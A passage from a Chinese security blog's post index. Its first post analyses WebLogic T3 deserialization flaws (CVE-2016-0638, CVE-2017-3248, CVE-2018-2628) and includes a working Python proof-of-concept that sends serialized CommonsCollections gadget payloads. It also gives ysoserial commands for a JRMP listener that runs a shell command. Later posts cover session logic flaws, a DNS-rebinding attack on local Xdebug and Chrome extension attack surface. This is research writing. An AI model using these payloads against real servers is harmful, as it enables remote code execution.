的洞。根据@breenmachine的文章，他当时找漏洞的方法是，对 weblogic 在 7001 端口的 T3 协议进行抓包，发现流量中有 java 反序列化之后数据的 Magic ac ed 00 05，然后替换掉对应的部分。作者抓包时执行的脚本是root@us-l-breens:/opt/OracleHome/user_projects/domains/base_domain/bin# ./stopWebLogic.sh。即在停止 weblogic 服务的时候，会往 7001 端口以 T3 协议认证并发送命令。即使作者输入了错误的用户名密码，也会有反序列化的数据存在。因此这个利用没有任何限制。 关于 T3 协议 oracle 给的资料并不多，只说该协议用于 WebLogic Server 之间或者 Server 与 client 的 RMI 通信。在这个时候，weblogic 没有进行任何的过滤，而常用的库如 CommonsCollections 有现成的 gadget 可以用，导致直接 RCE。在这之后，weblogic 用黑名单的方式对反序列化的类做了一些过滤，后面的几个 cve 也都是绕过黑名单。 在此复制一份 iswin 大佬写的无害poc。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import socketimport timeimport re## @author iswin@threathunter.org# reffer: nessus#VUL=['CVE-2016-0638','CVE-2016-3510','CVE-2017-3248']PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78','aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870','aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078']VER_SIG=['weblogic.jms.common.StreamMessageImpl','org.apache.commons.collections.functors.InvokerTransformer','\\\\$Proxy[0-9]+']def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful'def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('&#123;:04x&#125;'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('&#123;:08x&#125;'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return resdef checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(50) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) checkVul(rs,server_addr,index)if __name__==\"__main__\": dip = '10.8.56.17' dport = 7001 for i in range(0,len(VUL)): run(dip,dport,i) 还有一份 java 版的 T3 协议的模拟。 https://github.com/5up3rc/weblogic_cmd 参考https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogichttps://docs.oracle.com/cd/E28280_01/web.1111/e13721/rmi_t3.htmhttps://docs.oracle.com/cd/E11035_01/wls100/client/t3.htmlhttps://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https://github.com/jas502n/CVE-2018-2628 CVE-2018-2628根据 xxlegend 大佬的描述 来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。 很容易就能 grep 到这个类在 com.bea.core.weblogic.rmi.client.jar 中。1234➜ modules grep -r 'InboundMsgAbbrev' .Binary file ./clients/com.oracle.webservices.wls.jaxrpc-client.jar matchesBinary file ./clients/com.oracle.webservices.wls.jaxws-wlswss-client.jar matchesBinary file ./com.bea.core.weblogic.rmi.client.jar matches 在代码里看到了对java.rmi.registry.Registry的判断。即使用除此之外的其他方法就能绕过。在这个函数下断点，可以看到 xxlegend 大佬使用的是java.rmi.activation。12345678910111213protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123; String[] var2 = interfaces; int var3 = interfaces.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String intf = var2[var4]; if (intf.equals(\"java.rmi.registry.Registry\")) &#123; throw new InvalidObjectException(\"Unauthorized proxy deserialization\"); &#125; &#125; return super.resolveProxyClass(interfaces);&#125; 当我用 ysoserial 的 JRMPClient 生成 payload 放在上面的 python 脚本里时，发现在断点附近抛出了InvalidObjectException。所以说，ysoserial 生成的 payload 是用的java.rmi.registry.Registry，而 weblogic 对他进行了判断。只要修改 ysoserial 里 JRMPClient 的实现代码，改为用java.rmi.activation就行了。其实也不止是java.rmi.activation，只要是 extends java.rmi.Remote 的 interface 即可，如javax.management.remote.rmi.RMIConnection、sun.jvmstat.monitor.remote.RemoteVm等。 1Activator proxy = (Activator)Proxy.newProxyInstance(JRMPClient.class.getClassLoader(),new Class[]&#123;Activator.class&#125;,obj); 重新编译并生成payload。1java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 8.8.8.8:1099 在服务器执行java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;touch /tmp/salt&quot;。运行脚本即可成功。 参考https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGAhttps://github.com/frohoff/ysoserial 后续经过测试发现，在docker里的 weblogic 可以轻松打成功，而装在 Mac 上的 weblogic 就是打不动。远程的服务器能收到连接，但是命令没有执行。问了头师傅，说可能是因为那些基础库更新了，ysoserial 里的 gadget 不能使用了。为了实锤这一点，我从 docker 里看了下 commons-collections 库的版本，是 3.2.0。而 commons-collections 在 3.2.1 版本对反序列化问题做了一些检查。如果想在新版的 weblogic 上打成功需要找其他的 gadget。 参考https://commons.apache.org/proper/commons-collections/release_3_2_2.htmlhttps://xz.aliyun.com/t/1631 感谢头师傅全程带飞。","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"业务逻辑中的session问题","slug":"业务逻辑中的session问题","date":"2018-04-16T16:00:00.000Z","updated":"2019-08-16T04:24:28.786Z","comments":true,"path":"2018/04/业务逻辑中的session问题/","link":"","permalink":"http://5alt.me/2018/04/业务逻辑中的session问题/","excerpt":"在之前的一些安全检测中，经常会遇到一些逻辑漏洞。有些问题可以看到有很多测试是否存在问题的方法，很少有说明漏洞产生的原因。在这儿简单说几个与session有关的问题以及原因。 在WEB中，很重要的一个特征就是每个HTTP请求都是独立的，服务器通过session和数据库记录当前请求的状态。session可以看作数据库的一层缓存，用户是不能直接控制的。有的服务端代码实现上存在一些问题，导致实际运行逻辑和session中的状态不一定匹配，从而产生一些逻辑漏洞。","text":"在之前的一些安全检测中，经常会遇到一些逻辑漏洞。有些问题可以看到有很多测试是否存在问题的方法，很少有说明漏洞产生的原因。在这儿简单说几个与session有关的问题以及原因。 在WEB中，很重要的一个特征就是每个HTTP请求都是独立的，服务器通过session和数据库记录当前请求的状态。session可以看作数据库的一层缓存，用户是不能直接控制的。有的服务端代码实现上存在一些问题，导致实际运行逻辑和session中的状态不一定匹配，从而产生一些逻辑漏洞。 步骤乱序服务器在业务逻辑中需要校验之前的步骤有没有完成，如果没有做好检查，这样有些步骤可能被跳过，有些后面的步骤可以放在前面干扰业务逻辑，导致出现逻辑漏洞。一个非常简单的例子就是在更换手机号的时候没有检查是否完成了旧手机号的验证，导致可以直接进行绑定新手机号的逻辑。 session 中字段名冲突很多情况下一套业务逻辑是由多个步骤完成的，这时候在session中经常会存储一些值来记录业务流程中的一些数据。当提交的请求中不包含一些数据，但是业务逻辑的确又会用到这些数据的时候，这些数据有极大的可能存放在session中。程序员在开发的过程中为变量取名有一定的规律，比如为手机号码取名为phone，甚至在两个用于不同的业务逻辑中的手机号码习惯性的取同一个session名字，此时在session中发生字段名冲突，可能造成对应session值的覆盖。 以手机号码短信验证逻辑为例。在正确的业务流程中，每一个验证码有三个特征：phone(电话)，code(验证码)，type(业务)。一般分为四种类型： phone, code, type相互独立 phone和code绑定 type和code绑定 三者同时绑定 绑定的意思是，其中一项不能被单独覆盖掉。根据这四种类型，可以有如下几种攻击方式。 业务覆盖用自己的修改密码处的验证码，提交在找回别人密码处。 用户名冲突通过某些验证后，利用其他功能（如找回密码）将session中手机号替换成受害者的手机号。 验证码名冲突验证码存放在session里，找其他能向任意手机发送验证码的地方，如注册处，获得的验证码填充在用于验证不可控的地方。 当然，正确的处理方式是phone, code, type三者绑定，并避免字段名冲突。 session和数据库不一致为了方便，服务器经常会从session中取数据进行业务逻辑操作。而session作为数据库之上的缓存，可能会发生session与数据库不一致的情况。这种问题常常出现在在两个浏览器中登录同一个账号，在其中一个浏览器中对数据库进行了操作，导致数据库中的数据和第二个浏览器session中的数据不一致，可能会出现一些逻辑问题。 业务场景可能出现在物品买卖处，如果为了方便直接从session里获取余额而没查一次数据库，则可能出现问题。 最后，上述攻击模型不能覆盖到所有的实际场景，如有新的思路希望能一起探讨。","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"利用恶意页面攻击本地Xdebug","slug":"利用恶意页面攻击本地Xdebug","date":"2018-04-02T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2018/04/利用恶意页面攻击本地Xdebug/","link":"","permalink":"http://5alt.me/2018/04/利用恶意页面攻击本地Xdebug/","excerpt":"TL;DRPHP开发者以及一些安全研究人员经常会在本地搭建一个基于Xdebug的PHP的调试服务，在大部分配置情况下，Xdebug采用HTTP请求头中的X-Forwarded-For字段作为DBGp协议的回连地址。受害者浏览攻击页面一段时间，攻击者可利用DNS Rebind技术向本地服务器发送带有恶意X-Forwarded-For的请求，即有可能在受害者电脑上执行任意代码。 前段时间看到VSCode修复了一个RCE的漏洞，讲的是VSCode在本地开放了一个Nodejs的调试端口，通过DNS Rebind的技术可以获取到调试用的WebSocket接口，即可执行任意代码实现RCE。这让我想起了PHP的调试工具Xdebug。","text":"TL;DRPHP开发者以及一些安全研究人员经常会在本地搭建一个基于Xdebug的PHP的调试服务，在大部分配置情况下，Xdebug采用HTTP请求头中的X-Forwarded-For字段作为DBGp协议的回连地址。受害者浏览攻击页面一段时间，攻击者可利用DNS Rebind技术向本地服务器发送带有恶意X-Forwarded-For的请求，即有可能在受害者电脑上执行任意代码。 前段时间看到VSCode修复了一个RCE的漏洞，讲的是VSCode在本地开放了一个Nodejs的调试端口，通过DNS Rebind的技术可以获取到调试用的WebSocket接口，即可执行任意代码实现RCE。这让我想起了PHP的调试工具Xdebug。Xdebug是用于调试PHP的扩展，可以根据本地源码远程调试服务器上的PHP代码。很多开发者和安全研究人员通常会在本地搭建一套PHP的调试环境，用于日常的开发和调试。对于Xdebug的攻击，之前Ricter写了一篇文章介绍过。文章里提到了如果服务器开启了Xdebug的回连，并且攻击者能直接访问到服务器的话，可以直接造成RCE。 但是大部分情况下，这些服务器处于内网环境中，有些甚至监听在127.0.0.1上，攻击者很难直接访问到，导致无法利用。如果把开发人员当做代理，利用CSRF来攻击位于内网的Xdebug呢？ 我们首先看一下Xdebug有关远程调试的文档。如果xdebug.remote_connect_back启用，xdebug.remote_host没有设置，Xdebug会主动连接发起HTTP请求的客户端。Xdebug会依次检测$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]、$_SERVER[&#39;REMOTE_ADDR&#39;]来决定回连的IP地址。 即当Xdebug有类似如下的配置的时候，即有机会让Xdebug回连到请求头中X-Forwarded-For指向的ip地址。123xdebug.remote_connect_back = 1xdebug.remote_enable = 1xdebug.remote_log = /tmp/test.log 一般来讲，在PHP开发人员的本地环境中会有index.php和config.php等文件。在受害者访问攻击者的恶意页面时，攻击者可以让受害者在浏览器里尝试向本地url如http://127.0.0.1/index.php?XDEBUG_SESSION_START或者http://127.0.0.1/config.php?XDEBUG_SESSION_START发起HTTP请求，并带有指向攻击者服务器的X-Forwarded-For请求头。这样攻击者就能在自己的服务器上收到来自受害者的DBGp协议的连接，在受害者的电脑上执行任意PHP代码。 我们都知道，在浏览器里发送带有非simple header的CORS请求的时候，需要先发送一个preflight request探测服务器是否允许发送这种请求头。此检测过程是由一个OPTIONS请求完成的。如果OPTIONS请求的响应头里有Access-Control-Allow-Headers: X-Forwarded-For这一项的话，才能发送带有X-Forwarded-For的GET或者POST请求。在受害者的本地环境中，几乎不会有这种响应头的。 不过，攻击者可以采用DNS Rebind的方式来绕过这个限制。攻击者首先自己搭建一个DNS解析服务器，让自己控制的域名在发生第一次DNS解析的时候指向攻击者的服务器，以后都解析到127.0.0.1。这样当受害者访问攻击者的页面（http://attacker-domain-with-dns-rebind/exp.html）的时候，会从攻击者的服务器上拉取攻击代码，使浏览器循环向http://attacker-domain-with-dns-rebind/index.php?XDEBUG_SESSION_START发送带有恶意X-Forwarded-For头的请求。因为攻击者存放攻击代码的页面和触发Xdebug回连请求的url在同一个域内，即可不用发送前面所说的preflight request。 由于DNS的解析结果也存在一定的缓存时间，在浏览器里大概需要1分钟的时间才会失效进行第二次解析。在发生第二次解析的时候，其指向的IP地址会变为127.0.0.1，即向受害者本地的服务器发送能触发Xdebug反弹的请求，这时候攻击者的服务器就能收到来自受害者Xdebug的连接了。攻击者可以通过DBGp协议中的eval命令在客户端执行任意php代码。 我们认为漏洞的成因是Xdebug从X-Forwarded-For头中取IP作为回连地址，而X-Forwarded-For头是不可信的。 我于2018年3月26日将此问题报告给PHP官方，PHP官方人员于2018年3月30日作出回应，不认为这是一个安全问题，并将报告转为bug使之处于公开状态。建议PHP开发人员和安全研究人员在Xdebug的配置文件中根据当前情况增加xdebug.remote_host配置项，来防止自己遭受此攻击。 参考文献https://bugs.php.net/bug.php?id=76149https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surfacehttps://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486bhttp://bluec0re.blogspot.ch/2018/03/cve-2018-7160-pwning-nodejs-developers.html","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"chrome 浏览器扩展安全","slug":"浏览器扩展安全","date":"2018-02-26T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2018/02/浏览器扩展安全/","link":"","permalink":"http://5alt.me/2018/02/浏览器扩展安全/","excerpt":"去年8月份的时候fc老板带我搞了一波浏览器扩展的问题，屯了一些思路想批量扫描一下 chrome 扩展商店里的热门扩展，一直拖着没动，今天发现被大佬做了。 浏览器扩展的配置文件为manifest.json，里面规定了扩展的权限和一些其他的属性。其中比较常见且重要的属性有content_security_policy, permissions, content_scripts。content_security_policy指明了扩展所遵循的CSP规则，permissions代表扩展所拥有的访问权限，content_scripts则是会插入到页面中的脚本。","text":"去年8月份的时候fc老板带我搞了一波浏览器扩展的问题，屯了一些思路想批量扫描一下 chrome 扩展商店里的热门扩展，一直拖着没动，今天发现被大佬做了。 浏览器扩展的配置文件为manifest.json，里面规定了扩展的权限和一些其他的属性。其中比较常见且重要的属性有content_security_policy, permissions, content_scripts。content_security_policy指明了扩展所遵循的CSP规则，permissions代表扩展所拥有的访问权限，content_scripts则是会插入到页面中的脚本。 浏览器扩展的CSP在chrome浏览器的文档里，默认的CSP是script-src &#39;self&#39;; object-src &#39;self&#39;。而在某第三方浏览器中，扩展默认的CSP是script-src &#39;self&#39; blob: filesystem: chrome-extension-resource:; object-src &#39;self&#39; blob: filesystem:;。 其中，blob协议和filesystem协议只能用过JavaScript代码来创建。 这意味着，在扩展里默认不能使用内联脚本，不能引用外部的js文件，不能动态类似eval那样执行js。同时我们也不能引入外部的swf文件通过flash来xss。因此，即使在扩展里发现了dom类型的xss，也难以利用来完成攻击。即innerHTML或者document.write之类方法根本不需要去看，即使能利用成功插入任意内容也不能执行JavaScript代码。 当然，在引用了一些有漏洞的库之后，还是存在被攻击的可能的。（ 如 http://5alt.me/2017/09/jQuery%E9%87%8C%E7%9A%84html()/ ） 浏览器的 content_scriptscontent_scripts会在网页的上下文中运行，不过是在一个称为隔离环境的特殊环境中执行。它们可以访问所在页面的 DOM，但是不能访问当前页面创建的任何 JavaScript 变量或函数。在当前页面运行的 JavaScript 不能调用或访问任何内容脚本定义的函数或变量。content_scripts执行的域是当前页面所在的域，但是仍有部分特权。 当然有的浏览器里并未对此做隔离，导致了扩展里调用的函数被页面中js劫持的情况。不过在不存在问题的情况下，很难对content_scripts做手脚，因此与之相关的manifest.json的配置项提到的文件以及chrome.tabs.executeScript函数都可以不必关心。 有人可能存在疑问，像tampermonkey，它往页面注入js脚本，脚本中的变量可以被页面访问到，这不是违反了安全规则么。tampermonkey的做法是，先往页面中动态插一个script节点，执行完毕之后删除。这样在页面的DOM里不会发现注入的脚本，同时脚本也和当前页面在同一个执行环境里。 123456// page.jsinject: function(a) &#123; var u = \"text/xml\" == document.contentType ? document.createElementNS(\"http://www.w3.org/1999/xhtml\", \"script\") : document.createElement(\"script\"); u.textContent = a; (document.head || document.body || document.documentElement || document).appendChild(u); u.parentNode.removeChild(u) 此外，根据nearg1e大佬的文章， background 并不是每次访问页面执行一次，内部定义的变量不会因为页面刷新而重新定义。 background 即使域改变也不会重新定义和赋值，所有的域都用一个 runtime。 第一点使得这个漏洞更加容易利用，第二点使得我们所写的 payload 并不只影响在 payload 中利用的网站，而是在浏览器和扩展为重启之前，每次访问新的页面都可以在不同域下触发 payload。 浏览器扩展的通信方式在浏览器中，页面与扩展通信、扩展之间通信、扩展内通信采用的是消息机制。扩展可以通过chrome.runtime.onMessage, chrome.runtime.onMessageExternal, chrome.runtime.onConnect, chrome.runtime.onConnectExternal监听消息事件并处理。其中chrome.runtime.onMessage和chrome.runtime.onConnect监听的是扩展内部消息传送，而chrome.runtime.onMessageExternal和chrome.runtime.onConnectExternal则是接收页面和其他扩展的消息。所以我们需要关注的是后面两个External的接口。 接口的权限在manifest.json的externally_connectable中进行权限设置，但有的浏览器会在此之外自行添加可以发起通信的作用域。这里更多的会出现一些逻辑问题。（尤其是在CSP的影响下） 除此之外，扩展还可以通过window.addEventListener的方式在原页面添加事件，如message事件，从页面获取事件消息。 浏览器的特权API很多人谈浏览器安全总是绕不过一个词叫做特权域。其实并不是因为这个域被列入了特权的白名单，而是有些特权的API只允许某些页面来调用。chrome源码里有几个_api_features.json文件规定了一些API的调用来源范围。如果在某个有危险功能API所允许的域上发现了XSS，那么就会出现严重的安全问题。虽然有些API只允许某个域上的某些页面调用特权API，但是如果在这个域上的其他页面发现XSS也是可以进行攻击的，毕竟同域上没有页面之间隔离的说法。同理，如果特权API允许了http页面来调用，还会存在被中间人的风险。所以寻找浏览器扩展方面的安全问题最好能知道浏览器存在哪些API，然后筛选出具有敏感操作的API，找出这些API允许调用的页面，然后寻找页面所在域的问题。不过浏览器会存在一些默认的安全机制，阻止跨协议的跳转。即使有些页面存在 DOM 型的 XSS，但由于无法从http协议页面跳转过去，其被利用的可能性就会大大降低。 附一个解析_api_features.json的小脚本。 浏览器扩展的攻击面从上面我们可以看到，在默认的情况下，即使一个扩展做的非常烂，由于浏览器默认的安全机制，也能保证该扩展自身大概率不受攻击。 如果攻击者能控制允许发消息的页面能发起通信，那么需要找扩展的chrome.runtime.onMessageExternal和chrome.runtime.onConnectExternal事件，分析是否存在问题。如果攻击者能在特权域找到一个XSS，就可以通过允许该页面允许的特权API做一些事情。如果攻击者能中间人，可以尝试中间人特权域页面，或者寻找扩展中http的请求。如果扩展将用户的数据innerHTML到扩展自身的页面显示，在CSP设置有问题的前提下，可以以扩展的权限执行代码。如果扩展会在第三方页面上利用innerHTML方式插入一些代码并直接拼接了用户数据，则可能造成该页面的xss。如果扩展将用户可控的内容以html的形式输出在页面上的话，需要注意是否会造成当前域以及其他域的xss。 在实际的攻击利用场景中，寻找特权域xss的方式是比较常见的，但中间人造成的影响不容忽视。 最后附一个静态分析 js 里关键字来辅助找扩展漏洞的脚本。 参考资料https://content-security-policy.com/https://developer.chrome.com/extensions/contentSecurityPolicyhttps://developer.chrome.com/extensions/content_scriptshttps://developer.chrome.com/extensions/messaginghttps://crxdoc-zh.appspot.com/extensions/https://chromium.googlesource.com/chromium/src/+/master/chrome/common/extensions/api/_features.mdhttp://blog.gclxry.com/chrome-extension-features/https://www.anquanke.com/post/id/98917","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"子域名收集及端口扫描之ZeroScan","slug":"子域名收集及端口扫描之ZeroScan","date":"2018-01-29T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2018/01/子域名收集及端口扫描之ZeroScan/","link":"","permalink":"http://5alt.me/2018/01/子域名收集及端口扫描之ZeroScan/","excerpt":"为了自动化日常的一些渗透测试任务，做了一个前期信息收集的轮子。Zer